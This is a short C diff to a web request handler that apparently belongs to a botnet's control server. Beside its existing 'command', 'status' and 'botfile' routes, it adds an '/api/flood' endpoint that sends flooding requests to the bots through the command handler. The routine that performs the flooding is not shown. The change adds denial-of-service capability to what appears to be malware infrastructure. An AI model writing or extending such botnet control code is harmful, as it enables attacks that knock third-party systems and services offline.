@@ -508,6 +508,9 @@ void handle_request(struct mg_connection *c, int ev, void *ev_data) {
         } else if (strncmp(hm->uri.buf, "/api/command", hm->uri.len) == 0) {
             output_log("Received send command request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
             handle_send_command(c, hm);
+        } else if (strncmp(hm->uri.buf, "/api/flood", hm->uri.len) == 0) {
+            output_log("Received flooding request from webserver!\n", LOG_DEBUG, LOG_TO_CONSOLE);
+            handle_send_command(c, hm);
         } else if (strncmp(hm->uri.buf, "/api/status", hm->uri.len) == 0) {
             handle_server_status(c, hm, socket, connect, mg_http_reply);
         } else if (strncmp(hm->uri.buf, "/api/botfile", hm->uri.len) == 0) {
